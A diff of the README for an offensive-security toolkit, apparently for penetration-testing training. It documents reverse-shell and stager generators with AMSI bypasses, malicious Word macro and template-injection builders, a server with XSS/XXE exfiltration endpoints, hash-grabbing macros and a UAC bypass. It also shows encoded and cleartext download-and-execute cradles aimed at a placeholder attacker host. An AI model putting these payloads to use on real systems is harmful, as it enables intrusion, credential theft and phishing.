@@ -1,25 +1,18 @@
 # PoorMansArmory
-Originally developed for [OSEP](https://www.offsec.com/courses/pen-300/), this repository offers a wide collection of robust and versatile tools.  One goal was to prioritize verbosity, user-friendliness, and compatibility while serving as a powerful (and educational) resource.
+Originally developed for [OSEP](https://www.offsec.com/courses/pen-300/), **PoorMansArmory** is a personal project of mine that is a collection of robust Windows-based payload generators and tools that aim to bypass AMSI, Windows Defender, and self-signed certificate checks. 
 
 **The tools included range from...**
 - Malleable reverse shell generation w/ optional SSL support, AMSI bypasses, self-signed certificate bypasses, etc.
-- Full automation of template injecting and/or macro infesting Office Word documents.
-- Intuitive lateral file transfers over HTTPS via self-signed certificates.
+- Full automation of template injecting and/or macro infesting Office Word documents via the Office API.
+- Intuitive lateral file transfers over HTTPS via self-signed certificates using a custom python Flask web server.
+- Simple template web exploitation PoC payloads for XSS and XXE.
 - Robust service enumeration (e.g., unquoted service path detection & auditing, service binary ACLs).
 - Educational Proof-of-Concept payloads (e.g., PowerShell keylogger with built-in exfiltration).
 - etc., etc., etc.
 
+---
 
-
-```
-                                         _ _
-                                        | | |    ____  __  __      _     
-                                        | | |   |  _ \|  \/  |    / \     
-Mom: "We have Sick Scripts™ at home!"   | | |   | |_) | |\/| |   / _ \    
-The Sick Scripts™ at Home:              | | |   |  __/| |  | |_ / ___ \ _ 
-                                        | | |   |_| (_)_|  |_(_)_/   \_(_) 
-                                        |_|_|
-```
+![Banner](https://cdn.discordapp.com/attachments/855920119292362802/1210100426901422080/image.png?ex=65e954d8&is=65d6dfd8&hm=d54be4834bd9af070f084499b6c7930f0d6552b5af5d49a17a0f59da9001ed4e&)
 
 
 ## Table of Contents <a name="tableContents"></a>
@@ -30,28 +23,25 @@ The Sick Scripts™ at Home:              | | |   |  __/| |  | |_ / ___ \ _
 3. [**revshells**](#revshells)
     - [**Get-RevShell.ps1**](#getRevShell)
     - [**Get-Stager.ps1**](#getStager)
+	- [**Examples**](#placeholder)
 4. [**officemacros**](#officemacros)
     - [**Get-MacroInfestedWordDoc.ps1**](#macroDoc)
     - [**Get-TemplateInjectedPayload.ps1**](#templateInject)
+	- [**Get-VBAMacro.ps1**](#placeholder)
 5. [**privesc**](#privesc)
     - [**Enum-Services.ps1**](#enumServices)
     - [**Invoke-FodHelperUACBypass.ps1**](#fodHelper)
-6. [**misc**](#misc)
+6. [**wrappers**](#wrappers)
+    - [**pma-server.sh**](#placeholder)
+	- [**revshells.sh**](#placeholder)
+	- [**vba-macro.sh**](#placeholder)
+7. [**misc**](#misc)
     - [**Helpers**](#helpers)
     - [**Proof-of-Concept**](#poc)
     - [**Educational**](#educational)
-7. [**License**](#license)
-
+8. [**License**](#license)
+ 
 ---
-
-> [!IMPORTANT]
-> Below is a personal to-do list before I am content with this repository...
-> - Adjust scripts to avoid Write-Host for revshell compatibility.
-> - Refine the Get-Help messages in ``officemacros``.
-> - Overhaul the README.md
-> - Fix the logic in ``Enum-Services.ps1`` when using '-FullControl'.
----
-    
 
 ## 1. Import-PMA.ps1 <a name="importPMA"></a>
 This is a simple script to import the primary **PoorMansArmory** scripts into the current session,
@@ -63,7 +53,7 @@ while ignoring the less important ones (i.e., ``misc``, ``officemacros/lib``).
 ```
 ![Import-PMA.ps1](https://cdn.discordapp.com/attachments/855920119292362802/1156693253626798120/image.png?ex=6515e609&is=65149489&hm=b9e8066b734d9e4e4e2c43acd2664ed4c340006e1268916c5b3a9d05362a1f80&)
 
-
+---
 
 ## 2. pma_server.py <a name="pmaServer"></a>
 ```
@@ -71,6 +61,15 @@ while ignoring the less important ones (i.e., ``misc``, ``officemacros/lib``).
 # Simple Flask web server for bi-directional file transfers, supporting
 # both HTTP and HTTPS using self-signed certificates.  Intended to be
 # used with the PowerShell WebClient helper script(s).
+
+# Version 4.0.0 introduces Web Exploitation support:
+# o  XSS Cookie Exfiltration           (/cookie/<cookie_value>)
+# o  XSS Saved Credential Exfiltration (/user/<username>, /password/<password>)
+# o  XSS Keylogging                    (/keys/<key>)
+# o  XXE Exfiltration                  (/xxe?content=<file_content>)
+
+# Version 4.2.0 introduces "OPSEC" support:
+# o  Static URL with file uploads/downloads specified in HTTP headers.
 
 # Parameters:
 # --directory <string>  (default: ./uploads)
@@ -118,8 +117,9 @@ hosted files into the session.  If the filename ends with ``.dll`` or ``.exe``, 
 
 [**``Return to Table of Contents``**](#tableContents)
 
+---
 
-## 2. revshells <a name="revshells"></a>
+## 3. revshells <a name="revshells"></a>
 This directory contains scripts intended for advanced, robust reverse shell generation. They have been
 tested and built to work in both Linux and Windows Environments (i.e., **PowerShell** and **PowerShell Core / pwsh**),
 and default to PowerShell 5.0 payloads, but can be toggled to support PowerShell 2.0.
@@ -132,13 +132,13 @@ powershell -nop -ex bypass -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQ
 ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwACgAcwApADoALwAvADwAaQBwAF8AYQBkAGQAcgA+AC8AZAAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=
 ```
 
-**Above example creates a reverse shell payload that...**
-
-1. Is encrypted over self-signed SSL certificates
-2. Includes an AMSI bypass
-3. Has "WebClientHelpers" built-in
-4. Is output to the ``./uploads`` directory that is served by ``pma_server.py``
-5. Has a stager (or cradle) created pointing to that payload.
+> [!info]
+> **Above example creates a reverse shell payload that...**
+> 1. Is encrypted over self-signed SSL certificates
+> 2. Includes an AMSI bypass
+> 3. Has "WebClientHelpers" built-in
+> 4. Is output to the ``./uploads`` directory that is served by ``pma_server.py``
+> 5. Has a stager (or cradle) created pointing to that payload.
 
 [**``Return to Table of Contents``**](#tableContents)
 
@@ -152,29 +152,31 @@ ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwACgAcwApADoALwAvADwAaQBwAF8
 # 
 # Parameters:
 #    Main Functionality
-#      -IPAddress             -->   Attacker IP address (required)
+#      -IPAddress             -->   Attacker IP address or hostname (required)
 #      -Port                  -->   Attacker listening port (required)
 #      -Raw                   -->   Return reverse shell payload in cleartext rather than base64
 #      -Help                  -->   Return Get-Help information
 #
 #    Modular Options
-#      -AmsiBypass            -->   Disable AMSI in current session (validated: 26SEP2023)
+#      -AmsiBypass            -->   Disable AMSI in current session
 #      -SSL                   -->   Encrypt reverse shell via SSL with self-signed certificates
 #      -HttpsBypass           -->   Disable HTTPS self-signed certificate checks in the session
 #      -B64Reflection         -->   Reflects a static Base64 string of 'SSC.dll' instead of using Add-Type in the payload
 #      -PowerShell2Support    -->   Adjust the reverse shell payload to support PowerShell 2.0
+#      -Binary                -->   PowerShell binary to use (default: 'powershell')
 #      -Headless              -->   Create reverse shell payload without '-nop -ex bypass -wi h' parameters
 #      -Verbose               -->   Make reverse shell variables descriptive instead of randomly generated
 #
 #    PMA Server Compatibility (Static)
-#      -WebClientHelpers      -->   Add WebClientHelpers ('download','upload','import') into the revshell, pointing to the revshell IP address
 #      -RemoteReflection      -->   Remotely reflect 'SSC.dll' from the revshell IP address instead of using Add-Type in the payload
+#      -WebClientHelpers      -->   Add WebClientHelpers ('download','upload','import') into the revshell, pointing to the revshell IP address
+#      -WebClientOpsec        -->   WebClientHelpers, but hiding filename requests in the HTTP request headers instead of in the URL.
 #
 #    PMA Server Compatibility (Specified)
 #      -RemoteReflectionURL   -->   Specific URL hosting 'SSC.dll' to reflect (e.g., 'http(s)://<ip_addr>/SSC.dll')
 #      -WebClientHelpersURL   -->   Specific URL of 'pma_server.py' to point WebClientHelpers to (e.g., 'http(s)://<ip_addr>')
+#      -WebClientOpsecURL     -->   Specific URL of 'pma_server.py' to point WebClientHelpers to via OPSEC method.
 ```
-- Pretty pictures here.
 
 [**``Return to Table of Contents``**](#tableContents)
 
@@ -188,38 +190,73 @@ ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwACgAcwApADoALwAvADwAaQBwAF8
 #   -PayloadURL  -->  URL pointing to the reverse shell payload
 #   -Command     -->  PowerShell command to execute instead of a reverse shell stager
 #   -Raw         -->  Return stager payload in cleartext rather than base64
+#   -Binary      -->  PowerShell binary to use (default: 'powershell')
 #   -Headless    -->  Create stager payload without '-' parameters
 #   -Help        -->  Return Get-Help information
 ```
-- Pretty pictures here.
 
 [**``Return to Table of Contents``**](#tableContents)
 
 
-### Example below 
+### Examples 
 
+```powershell
+# View all parameters
+Get-RevShell -Help
+Get-Stager -Help
 
+# Simple PowerShell Reverse Shell (base64)
+Get-RevShell <attacker_ip> <listening_port>
+
+# Simple PowerShell Reverse Shell (cleartext)
+Get-RevShell <attacker_ip> <listening_port> -Raw
+
+# PowerShell 2.0 Compatible Reverse Shell w/ Verbose Variables (cleartext)
+Get-RevShell <attacker_ip> <listening_port> -Raw -Verbose -PowerShell2Support
+
+# SSL Encrypted PowerShell Reverse Shell w/ AMSI Bypass (base64)
+Get-RevShell <attacker_ip> <listening_port> -SSL -AmsiBypass
+
+# Stager pointing to Robust PowerShell Reverse Shell
+Get-RevShell <attacker_ip> <listening_port> -SSL -AmsiBypass -WebClientHelpers > ./uploads/revshell
+Get-Stager -PayloadURL "http(s)://<attacker_ip>/revshell"
+
+# Stager Output (default):
+powershell -nop -ex bypass -wi h -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAKABzACkAOgAvAC8APABhAHQAdABhAGMAawBlAHIAXwBpAHAAPgAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=
+
+# Stager Output (cleartext):
+powershell -nop -ex bypass -wi h -c {iex ((New-Object System.Net.WebClient).DownloadString('https(s)://<attacker_ip>/revshell'))}
+```
 
 [**``Return to Table of Contents``**](#tableContents)
 
+---
 
-## 3. officemacros <a name="officemacros"></a>
-Overview here.
+## 4. officemacros <a name="officemacros"></a>
+
+This directory contains scripts intended for Microsoft Office-based payloads in the form of VBA macros and remote template injection.  
 
 [**``Return to Table of Contents``**](#tableContents)
+
 
 ### ``Get-MacroInfestedWordDoc.ps1`` <a name="macroDoc"></a>
 ```
 # Synopsis:
 # Generate Macro Infested Word 97-2003 Documents (.doc)
+#
+# Requires: Microsoft Office API (VBA Project Object Model)
+# o  Enable   : 'Trust Access to the VBA project object model'
+# o  Location : Word --> Options --> Trust Center --> Macro Settings --> Developer Macro Settings
 # 
 # Parameters:
-#   -DocumentName   -->  Name of the malicious Word Document (.doc)
-#   -PayloadURL     -->  URL of the hosted payload that the macro points to
-#   -MacroContents  -->  Advanced: User input macro instead of the generated one
+#   -DocumentName   -->  Output name of the malicious Word Document (.doc)
+#   -PayloadURL     -->  URL of the hosted payload that the macro downloads and executes
+#   -MacroContents  -->  Advanced: User inputs custom macro instead of the generated one
 #   -Help           -->  Return Get-Help information
+
+# Example:
+Get-MacroInfestedWordDoc -DocumentName invoice.doc -PayloadURL http://<attacker_ip>/revshell
 ```
-- Pretty pictures here.
 
 [**``Return to Table of Contents``**](#tableContents)
 
@@ -227,22 +264,53 @@ Overview here.
 ### ``Get-TemplateInjectedPayload.ps1`` <a name="templateInject"></a>
 ```
 # Synopsis:
-# TBA
+# Generate Macro Infested Word Template (.dotm) an Inject into a Word Document (.docx)
+#
+# Requires: Microsoft Office API (VBA Project Object Model)
+# o  Enable   : 'Trust Access to the VBA project object model'
+# o  Location : Word --> Options --> Trust Center --> Macro Settings --> Developer Macro Settings
 # 
 # Parameters:
-#   -TemplateURL    -->  URL of the malicious Word Template (.dotm) being hosted
-#   -PayloadURL     -->  URL of the hosted payload that the macro points to
+#   -TemplateURL    -->  URL where the malicious Word Template (.dotm) will be hosted
+#   -PayloadURL     -->  URL of the hosted payload that the macro downloads and executes
 #   -Document       -->  Advanced: Target templated Word Document (.docx) to inject
-#   -MacroContents  -->  Advanced: User input macro instead of the generated one
+#   -MacroContents  -->  Advanced: User inputs custom macro instead of the generated one
 #   -Help           -->  Return Get-Help information
+
+# Example:
+Get-TemplateInjectedPayload -TemplateURL http://<attacker_ip>/office/update.dotm -PayloadURL http://<attacker_ip>/revshell
 ```
-- Pretty pictures here.
 
 [**``Return to Table of Contents``**](#tableContents)
 
+### ``Get-VBAMacro.ps1``
+```
+# Synopsis:
+# Simple VBA Macro Generator, supporting three types of payloads.
+#
+# Payloads:
+# o  Staged payload requires a URL hosting the intended text-based payload (with support for HTTPS via self-signed certificates).
+# o  Stagless payload is a simple barebones shell command.
+# o  Hash grabbing payload is a simple macro that reaches to a file share, revealing the user's NetNTLMv2 hash.
+#
+# Insert Into:
+# o  Project (<filename>) --> Microsoft Word Objects --> ThisDocument
+# 
+# Parameters: 
+#   -RawPayload  -->  Payload to execute via simple shell macro (Alias: Stageless) 
+#   -PayloadURL  -->  URL of a text-based payload that the macro executes (Alias: Staged) 
+#   -SharePath   -->  Share path macro reaches out to to reveal user's NetNTLMv2 hash
+#   -PrivateSub  -->  Make Subroutine Private instead of Public
+#   -Help        -->  Return Get-Help information
+```
 
-## 4. privesc <a name="privesc"></a>
-Overview here.
+[**``Return to Table of Contents``**](#tableContents)
+
+---
+
+## 5. privesc <a name="privesc"></a>
+
+This directory contains scripts intended for privilege escalation or enumeration for privilege escalation vectors.  
 
 [**``Return to Table of Contents``**](#tableContents)
 
@@ -286,9 +354,50 @@ Overview here.
 
 [**``Return to Table of Contents``**](#tableContents)
 
+---
 
-## 5. misc <a name="misc"></a>
-Overview here.
+## 6. wrappers <a name="wrappers"></a>
+
+These are simple wrappers in the style of the [impacket](https://github.com/fortra/impacket) project on Kali Linux.
+
+**Current wrappers:**
+- `pma-server.sh` : Allows pma_server.py usage from anywhere.
+- `revshells.sh`  : Allows Get-RevShell and Get-Stager usage from anywhere (requires: pwsh)
+- `vba-macro.sh`  : Allows Get-VBAMacro usage from anywhere (requires: pwsh)
+
+### Example Setup
+
+```sh
+git clone https://github.com/tylerdotrar/PoorMansArmory /usr/share/PoorMansArmory
+
+# PMA Server
+ln -s /usr/share/PoorMansArmory/wrappers/pma-server.sh /usr/bin/pma-server
+ln -s /usr/share/PoorMansArmory/wrappers/revshells.sh /usr/bin/Get-Stager
+# Usage:
+pma-server <bonus_args>
+pma-server --help
+
+# RevShells
+ln -s /usr/share/PoorMansArmory/wrappers/revshells.sh /usr/bin/Get-RevShell
+ln -s /usr/share/PoorMansArmory/wrappers/revshells.sh /usr/bin/Get-Stager
+# Usage:
+Get-RevShell <ip_addr> <port> <bonus_args>
+Get-RevShell -Help
+Get-Stager http(s)://<ip_addr>/<revshell_file> <bonus_args>
+Get-Stager -Help
+
+# VBA Macros
+ln -s /usr/share/PoorMansArmory/wrappers/vba-macro.sh /usr/bin/Get-VBAMacro
+# Usage:
+Get-VBAMacro <args>
+Get-VBAMacro -Help
+```
+
+[**``Return to Table of Contents``**](#tableContents)
+
+## 7. misc <a name="misc"></a>
+
+This directory contains scripts and `.dll's` that are either scarcely used, difficult to categorize, or simple/educational in design.  
 
 [**``Return to Table of Contents``**](#tableContents)
 
